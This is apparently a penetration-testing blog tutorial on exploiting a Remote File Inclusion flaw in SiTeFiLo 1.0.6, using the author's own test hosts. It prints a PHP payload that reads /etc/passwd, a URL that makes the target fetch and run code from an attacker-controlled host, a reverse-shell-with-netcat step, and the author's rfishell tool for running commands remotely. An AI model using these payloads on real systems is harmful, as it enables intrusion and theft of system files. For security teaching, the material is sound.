
In [Part 1](/2012/06/21/lets-kick-shell-ish-part-1-directory-traversal-made-easy/), we talked about getting a shell-like interface when attacking a target vulnerable to directory traversals. We continue with an article on exploiting Remote File Inclusion (RFI) attacks with a shell.

<!--more-->

Typically if you can find an RFI vulnerability, then you can get it to execute a reverse web shell and you're all done. So what's this article about? In some cases, you may encounter a target that has some serious egress filtering enabled, and you can't find an outgoing port to connect back to your netcat instance. Or maybe you don't want to use a reverse shell for whatever reason. Rather than having to manually edit your RFI file to run commands on the target, we'll create a shell-ish interface to make the hacking experience a little more pleasant.

Let's have a look at a basic RFI example. We've discovered a target running the Simple Text-File Login script (SiTeFiLo). Version 1.0.6 is vulnerable to RFI attacks, as detailed in this advisory: [http://www.securityfocus.com/bid/32811/](http://www.securityfocus.com/bid/32811/)

![](/images/2012-06-26/01.png)

According to the advisory, we can specify the location of our own header.inc.php and have the target execute our PHP code. Let's test this. We create a /var/www/header.inc.php.txt file with the following contents:

```
<?php 
print system("cat /etc/passwd");
?>
```

We craft our URL as follows, which will load our header.inc.php.txt into the target and have it execute cat /etc/passwd for us:

```
http://taint.techorganic.com/slogin/slogin_lib.inc.php?slogin_path=http://cactuar.techorganic.com/
```

When we load up that URL on the browser, we see our command get executed, and the contents of /etc/passwd displayed on the screen:

![](/images/2012-06-26/02.png)

Now that we've verified that we can run commands on the server, we grab our PHP reverse shell, rename it to header.inc.php.txt, fire up netcat to listen for connections, refresh the browser, and... nothing.

![](/images/2012-06-26/03.png)

Well as it turns out, this particular target we're attacking only allows inbound and outbound connections on port 80, and blocks everything else. One alternative around this is to host the PHP reverse shell elsewhere, and have netcat listen on port 80 for connections. If this isn't possible, or you don't want to have a reverse shell, here's one possible solution to simplify command execution on the target, without having to modify the PHP file manually.

I call it rfishell for lack of a better term. Much like dirtshell from Part 1 of this post, rfishell provides a shell-ish interface for you to work on, allowing quick command entry and a clean output. Let's check it out. The command we'll use is

```
rfishell -f /var/www/header.inc.php.txt -u "http://taint.techorganic.com/slogin/slogin_lib.inc.php?slogin_path=http://cactuar.techorganic.com/"
```

This tells rfishell to use /var/www/header.inc.php.txt as our PHP file containing the commands we want to run, and the target URL. When we hit Enter, rfishell presents us with a prompt. We'll enter the command

```
cat /etc/passwd
```

and see the results displayed to us:

![](/images/2012-06-26/04.png)

We can enter commands one after another, as if we were logged into the server with a shell:

![](/images/2012-06-26/05.png)

The script itself is very minimal, but definitely expandable. By default, it uses PHP, but you can modify the rfi_template function to tailor it for ASP, JSP, or whatever else. The script requires curl, so make sure you have that installed. You can get the latest version of rfishell from [GitHub](https://github.com/superkojiman/rfishell). 

The script only takes two parameters, the location of the file that will contain the commands to run, and the target URL. Commands you enter on the prompt are turned into PHP code and saved into the file specified with -f, and curl is used to retrieve the results.

Quick and simple; the way shell scripts should be.
